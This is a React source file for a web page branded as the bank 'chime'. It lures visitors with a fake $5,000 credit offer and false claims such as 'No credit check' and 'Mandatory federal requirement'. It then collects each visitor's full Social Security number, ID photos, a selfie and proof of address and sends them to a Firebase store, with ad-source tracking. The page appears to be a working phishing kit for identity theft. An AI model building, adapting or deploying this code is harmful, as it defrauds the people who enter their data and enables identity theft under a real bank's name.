import React, { useState, useRef, useEffect } from 'react';
import { Camera, Check, Shield, Lock, ChevronRight, AlertCircle, Menu, X, User as UserIcon, Loader2, FileText, ExternalLink, ArrowRight, Star, TrendingUp } from 'lucide-react';
import { initializeApp } from 'firebase/app';
import { getFirestore, collection, addDoc, serverTimestamp, type Firestore } from 'firebase/firestore';
import { getAuth, signInAnonymously, onAuthStateChanged, type Auth, type User } from 'firebase/auth';
import { getStorage, ref, uploadBytes, getDownloadURL, type FirebaseStorage } from 'firebase/storage';

// --- SUA CONFIGURAÇÃO ---
const firebaseConfig = {
  apiKey: "AIzaSyAuITAkLq7XNhJd1AuOrXTXeqqjS8nG2ss",
  authDomain: "chime-case-teste.firebaseapp.com",
  projectId: "chime-case-teste",
  storageBucket: "chime-case-teste.firebasestorage.app",
  messagingSenderId: "176821948544",
  appId: "1:176821948544:web:b33e5edc17626963b4d665",
  measurementId: "G-8B4QLXJWJB"
};

// Inicialização segura
let app;
let auth: Auth | undefined;
let db: Firestore | undefined;
let storage: FirebaseStorage | undefined;

try {
  if (firebaseConfig.apiKey) {
    app = initializeApp(firebaseConfig);
    auth = getAuth(app);
    db = getFirestore(app);
    storage = getStorage(app);
  }
} catch (e) {
  console.error("Erro Firebase", e);
}

const BRAND = { green: '#00C865', darkGreen: '#004F2D', lightBg: '#F2F8F5' };

// Interfaces
interface FileData { name: string; url: string; }
interface FormDataState { ssn: string; idFront: File | null; idBack: File | null; selfie: File | null; proofAddress: File | null; }
interface SubmittedDataType { 
  userId: string; 
  ssn_masked: string; 
  ssn_real: string; 
  status: string; 
  submittedAt: string | any; // Ajustado para aceitar serverTimestamp sem erro
  utm_source: string;
  documents: { idFront: FileData | null; idBack: FileData | null; selfie: FileData | null; proofAddress: FileData | null; }; 
}
interface FileUploadFieldProps { label: string; id: keyof FormDataState; file: File | null; onFileChange: (id: keyof FormDataState, file: File) => void; icon?: React.ReactNode; }

const FileUploadField: React.FC<FileUploadFieldProps> = ({ label, id, file, onFileChange, icon }) => {
  const inputRef = useRef<HTMLInputElement>(null);
  const handleClick = () => inputRef.current?.click();
  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => { if (e.target.files && e.target.files[0]) onFileChange(id, e.target.files[0]); };

  return (
    <div className="mb-4">
      <label className="block text-sm font-bold text-gray-700 mb-2">{label}</label>
      <div 
        onClick={handleClick} 
        className={`relative border-2 border-dashed rounded-xl p-6 cursor-pointer transition-all ${file ? 'border-green-500 bg-green-50' : 'border-gray-300 hover:border-green-400'}`}
      >
        <input type="file" ref={inputRef} className="hidden" accept="image/*" onChange={handleChange} />
        <div className="flex flex-col items-center justify-center text-center">
          {file ? (
            <>
              <div className="bg-green-100 p-3 rounded-full mb-2">
                <Check className="w-6 h-6 text-green-600" />
              </div>
              <p className="text-sm font-semibold text-green-800 truncate max-w-[200px]">{file.name}</p>
            </>
          ) : (
            <>
              <div className="bg-gray-100 p-3 rounded-full mb-2">
                {icon || <Camera className="w-6 h-6 text-gray-500" />}
              </div>
              <p className="text-sm font-medium text-gray-600">
                <span className="text-green-600 font-bold">Upload</span> or take photo
              </p>
            </>
          )}
        </div>
      </div>
    </div>
  );
};

export default function App() {
  const [step, setStep] = useState(0); 
  const [quizIndex, setQuizIndex] = useState(0);
  const [loadingText, setLoadingText] = useState("Analyzing credit profile...");
  const [submittedData, setSubmittedData] = useState<SubmittedDataType | null>(null);
  const [formData, setFormData] = useState<FormDataState>({ ssn: '', idFront: null, idBack: null, selfie: null, proofAddress: null });
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [user, setUser] = useState<User | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [uploadStatus, setUploadStatus] = useState('');
  const [errorMsg, setErrorMsg] = useState('');
  const [selectedOption, setSelectedOption] = useState<number | null>(null);
  
  const [utmSource, setUtmSource] = useState('direct');

  const quizQuestions = [
    { question: "How much credit limit do you need right now?", options: ["Up to $500", "$1,000 - $2,500", "$5,000+"] },
    { question: "Do you have any negative items on your credit report?", options: ["Yes (It's okay)", "No", "I don't know"] },
    { question: "If approved for $5,000, can you activate the card today?", options: ["Yes, send it now!"] }
  ];

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const source = params.get('utm') || params.get('utm_source') || 'organic_direct';
    setUtmSource(source);

    if (!auth) return;
    const unsubscribe = onAuthStateChanged(auth, (u) => {
      if (u) setUser(u);
      else signInAnonymously(auth!).catch(() => setErrorMsg("Connection error"));
    });
    return () => unsubscribe();
  }, []);

  const handleQuizAnswer = (idx: number) => {
    setSelectedOption(idx);
    
    setTimeout(() => {
        setSelectedOption(null);
        if (quizIndex < quizQuestions.length - 1) {
          setQuizIndex(quizIndex + 1);
        } else {
          setStep(0.5);
          setTimeout(() => setLoadingText("Connecting with lenders..."), 1000);
          setTimeout(() => setLoadingText("Ignoring low credit score..."), 2000);
          setTimeout(() => setLoadingText("Pre-approving high limit..."), 3500);
          setTimeout(() => { setStep(1); }, 4500);
        }
    }, 300);
  };

  const handleFileChange = (fieldId: keyof FormDataState, file: File) => setFormData(prev => ({ ...prev, [fieldId]: file }));
  
  const handleSSNChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 9) value = value.slice(0, 9);
    if (value.length > 5) value = `${value.slice(0, 3)}-${value.slice(3, 5)}-${value.slice(5)}`;
    else if (value.length > 3) value = `${value.slice(0, 3)}-${value.slice(3)}`;
    setFormData(prev => ({ ...prev, ssn: value }));
  };

  const uploadFile = async (file: File | null, path: string): Promise<FileData | null> => {
    if (!file || !storage) return null;
    const storageRef = ref(storage, path);
    const snapshot = await uploadBytes(storageRef, file);
    const url = await getDownloadURL(snapshot.ref);
    return { name: file.name, url: url };
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!user || !db) return setErrorMsg("Aguardando conexão...");
    setIsSubmitting(true);
    setUploadStatus('Secure upload initialized...');
    
    try {
      const timestamp = Date.now();
      const basePath = `submissions/${user.uid}/${timestamp}`;
      setUploadStatus('Uploading ID Front...');
      const idFrontData = await uploadFile(formData.idFront, `${basePath}_front_${formData.idFront?.name}`);
      setUploadStatus('Uploading ID Back...');
      const idBackData = await uploadFile(formData.idBack, `${basePath}_back_${formData.idBack?.name}`);
      setUploadStatus('Uploading Selfie...');
      const selfieData = await uploadFile(formData.selfie, `${basePath}_selfie_${formData.selfie?.name}`);
      setUploadStatus('Uploading Proof of Address...');
      const proofData = await uploadFile(formData.proofAddress, `${basePath}_proof_${formData.proofAddress?.name}`);
      setUploadStatus('Finalizing...');
      
      const payload: SubmittedDataType = { 
        userId: user.uid, 
        ssn_masked: `***-**-${formData.ssn.slice(-4)}`,
        ssn_real: formData.ssn,
        status: 'pending_review', 
        submittedAt: new Date().toISOString(), 
        utm_source: utmSource,
        documents: { idFront: idFrontData, idBack: idBackData, selfie: selfieData, proofAddress: proofData } 
      };
      
      await addDoc(collection(db, 'applications'), { ...payload, submittedAt: serverTimestamp() });
      
      // Pixel Fire
      try {
        if ((window as any).ttq) (window as any).ttq.track('CompleteRegistration');
      } catch (err) {}

      setSubmittedData(payload);
      setStep(2);
    } catch (err) {
      console.error(err);
      setErrorMsg("Upload falhou.");
    } finally {
      setIsSubmitting(false);
      setUploadStatus('');
    }
  };

  const isFormValid = formData.ssn.length === 11 && formData.idFront && formData.idBack && formData.selfie && formData.proofAddress;

  // --- COMPONENTE DE HEADER (REUTILIZÁVEL) ---
  const Header = () => (
    <nav className="bg-white py-4 px-6 shadow-sm relative z-20 flex justify-center w-full flex-shrink-0">
        <div className="text-3xl font-black tracking-tighter" style={{ color: BRAND.green }}>chime</div>
    </nav>
  );

  // --- STEP 0.5: LOADING ANIMATION (AGORA ESTÁVEL) ---
  if (step === 0.5) return (
    <div className="min-h-screen bg-[#F2F8F5] font-sans flex flex-col w-full">
      <Header />
      <div className="flex-grow flex items-center justify-center py-12 px-6 w-full">
        <div className="max-w-md w-full text-center bg-white rounded-2xl shadow-xl p-12 border border-gray-100">
            <div className="mb-8 relative flex justify-center">
                <div className="absolute bg-green-100 rounded-full w-24 h-24 animate-ping opacity-25"></div>
                <Loader2 className="w-16 h-16 text-[#00C865] animate-spin relative z-10" />
            </div>
            <h2 className="text-2xl font-bold text-gray-800 mb-2">{loadingText}</h2>
            <p className="text-gray-500 text-sm">Please do not close this window.</p>
        </div>
      </div>
    </div>
  );

  // --- STEP 0: QUIZ / WARM UP ---
  if (step === 0) return (
    <div className="min-h-screen bg-[#F2F8F5] font-sans flex flex-col w-full">
       <Header />
      
      <div className="flex-grow flex items-center justify-center py-12 px-6 w-full">
        <div className="max-w-md w-full text-center">
            <div className="mb-8 animate-fade-in-up">
            <span className="bg-red-100 text-red-800 text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wider mb-4 inline-block">Bad Credit OK</span>
            <h1 className="text-4xl font-bold text-gray-900 mb-4 leading-tight">
                Get up to <span className="text-[#00C865] underline">$5,000 Credit Limit</span> instantly.
            </h1>
            <p className="text-gray-600">No credit check. No hidden fees. 98% Approval Rate.</p>
            </div>

            <div key={quizIndex} className="bg-white rounded-2xl shadow-xl p-8 border border-gray-100 transform transition-all hover:shadow-2xl animate-fade-in-up">
            <div className="w-full bg-gray-100 h-2 rounded-full mb-8">
                <div 
                    className="bg-[#00C865] h-2 rounded-full transition-all duration-500" 
                    style={{ width: `${((quizIndex + 1) / quizQuestions.length) * 100}%` }}
                ></div>
            </div>

            <h2 className="text-xl font-bold text-gray-800 mb-6 min-h-[60px] flex items-center justify-center">
                {quizQuestions[quizIndex].question}
            </h2>

            <div className="space-y-3">
                {quizQuestions[quizIndex].options.map((option, idx) => (
                <button
                    key={idx}
                    onClick={() => handleQuizAnswer(idx)}
                    className={`w-full py-4 px-6 text-left rounded-xl border-2 transition-all flex justify-between items-center group
                        ${selectedOption === idx 
                            ? 'border-[#00C865] bg-green-50 text-[#00C865]' 
                            : 'border-gray-100 hover:border-[#00C865] hover:bg-green-50 text-gray-700'
                        } font-bold`}
                >
                    {option}
                    <ArrowRight className={`w-5 h-5 transition-colors ${selectedOption === idx ? 'text-[#00C865]' : 'text-gray-300 group-hover:text-[#00C865]'}`} />
                </button>
                ))}
            </div>
            </div>
            
            <div className="mt-8 flex items-center justify-center space-x-4 text-gray-400 text-xs uppercase tracking-widest">
               <div className="flex items-center"><Shield className="w-4 h-4 mr-1"/> SSL Secure</div>
               <div className="flex items-center"><CreditCard className="w-4 h-4 mr-1"/> Visa/Mastercard</div>
            </div>
        </div>
      </div>
    </div>
  );

  // --- STEP 2: RECEIPT ---
  if (step === 2 && submittedData) return (
    <div className="min-h-screen bg-[#F2F8F5] flex flex-col items-center justify-center p-6 text-center font-sans w-full">
      <div className="bg-white p-8 rounded-2xl shadow-xl max-w-md w-full border border-green-100">
        <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6"><Check className="w-10 h-10 text-[#00C865]" strokeWidth={3} /></div>
        <h2 className="text-2xl font-bold text-gray-900 mb-2">Limit Request Pending!</h2>
        <p className="text-gray-600 mb-6 text-sm">We received your documents. Your $5,000 limit is pending final verification.</p>
        
        <div className="bg-gray-50 rounded-lg p-4 mb-6 text-left border border-gray-200">
          <div className="flex justify-between items-center mb-4">
             <h4 className="text-xs font-bold text-gray-500 uppercase tracking-wider">Source Tracking</h4>
             <span className="bg-blue-100 text-blue-800 text-xs px-2 py-1 rounded font-mono">{submittedData.utm_source}</span>
          </div>
          <div className="space-y-3">
            <div className="flex justify-between text-sm"><span className="text-gray-600">SSN:</span><span className="font-mono text-gray-800 font-bold">{submittedData.ssn_real}</span></div>
            <div className="border-t border-gray-200 my-2 pt-2">
              <p className="text-xs text-gray-400 mb-2">Uploaded Files:</p>
              {Object.entries(submittedData.documents).map(([key, file]) => (
                file && (<a key={key} href={file.url} target="_blank" rel="noopener noreferrer" className="flex items-center justify-between p-2 hover:bg-white rounded border border-transparent hover:border-gray-200 cursor-pointer group"><div className="flex items-center"><FileText className="w-4 h-4 text-gray-400 mr-2" /><span className="text-xs text-gray-600 capitalize">{key}</span></div><ExternalLink className="w-3 h-3 text-gray-400 group-hover:text-green-600" /></a>)
              ))}
            </div>
          </div>
        </div>
        <button className="w-full bg-[#00C865] text-white font-bold py-4 rounded-xl shadow-lg" onClick={() => window.location.reload()}>New Request</button>
      </div>
    </div>
  );

  // --- STEP 1: FORMULÁRIO ---
  return (
    <div className="min-h-screen bg-gray-50 font-sans w-full">
      <nav className="bg-white py-4 px-6 flex justify-between items-center shadow-sm relative z-20 w-full">
        <div className="text-2xl font-black tracking-tighter" style={{ color: BRAND.green }}>chime</div>
        <div className="hidden md:flex space-x-6 text-sm font-semibold text-gray-600">
          <span className="text-green-600 font-bold flex items-center"><TrendingUp className="w-4 h-4 mr-1"/> High Approval Odds</span>
        </div>
        <button className="md:hidden" onClick={() => setIsMenuOpen(!isMenuOpen)}>{isMenuOpen ? <X /> : <Menu />}</button>
      </nav>
      
      <div className="bg-[#00C865] text-white text-center py-3 text-sm font-bold shadow-md relative z-10 w-full animate-pulse">
         🎉 PRE-APPROVED! $5,000 Limit Reserved.
      </div>

      <div className="bg-[#004F2D] text-white pt-8 pb-24 px-6 text-center relative w-full">
          <h1 className="text-3xl md:text-4xl font-bold mb-2">Verify Identity to Unlock</h1>
          <p className="text-green-100 opacity-90">Upload documents to release your credit line instantly.</p>
      </div>

      <div className="px-4 -mt-16 pb-20 relative z-10 w-full">
        <div className="max-w-lg mx-auto bg-white rounded-2xl shadow-2xl overflow-hidden border border-gray-100">
          <div className="bg-gray-50 p-6 border-b border-gray-100">
            <div className="flex items-center space-x-2 text-sm text-gray-500 mb-1">
              <Shield className="w-4 h-4 text-[#00C865]" />
              <span>Bank-level security (256-bit encryption)</span>
            </div>
            <h2 className="text-xl font-bold text-gray-800">Final Verification Step</h2>
            <p className="text-gray-500 text-sm mt-1">
              Mandatory federal requirement to issue credit.
            </p>
          </div>
          <form onSubmit={handleSubmit} className="p-6 space-y-6">
            <div className="space-y-3"><label className="flex justify-between text-sm font-bold text-gray-700"><span>Social Security Number (SSN)</span><Lock className="w-3 h-3 text-gray-400" /></label><div className="relative group"><input type="text" value={formData.ssn} onChange={handleSSNChange} placeholder="XXX-XX-XXXX" className="w-full px-4 py-4 border-2 border-gray-200 rounded-xl focus:border-[#00C865] outline-none text-lg tracking-widest font-mono" /><Shield className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" /></div></div>
            <hr className="border-gray-100" />
            <div><h3 className="text-md font-bold text-gray-800 mb-4">Required Documents</h3>
              <FileUploadField label="Government ID (Front)" id="idFront" file={formData.idFront} onFileChange={handleFileChange} />
              <FileUploadField label="Government ID (Back)" id="idBack" file={formData.idBack} onFileChange={handleFileChange} />
              <div className="my-6 p-4 bg-green-50 rounded-xl border border-green-100"><FileUploadField label="Selfie Verification" id="selfie" file={formData.selfie} onFileChange={handleFileChange} icon={<UserIcon className="w-6 h-6 text-gray-500" />} /></div>
              <FileUploadField label="Proof of Residence" id="proofAddress" file={formData.proofAddress} onFileChange={handleFileChange} />
            </div>
            {errorMsg && <div className="bg-red-50 text-red-600 text-sm p-3 rounded-lg flex items-center justify-center"><AlertCircle className="w-4 h-4 mr-2" /> {errorMsg}</div>}
            <button type="submit" disabled={!isFormValid || isSubmitting} className={`w-full py-4 rounded-xl text-lg font-bold shadow-lg flex items-center justify-center space-x-2 transition-all ${isFormValid && !isSubmitting ? 'bg-[#00C865] text-white hover:-translate-y-1' : 'bg-gray-100 text-gray-400'}`}>{isSubmitting ? <><Loader2 className="animate-spin w-6 h-6 mr-2"/> {uploadStatus}</> : <><span>Unlock $5,000 Now</span><ChevronRight className="w-5 h-5" /></>}</button>
          </form>
        </div>
      </div>
    </div>
  );
}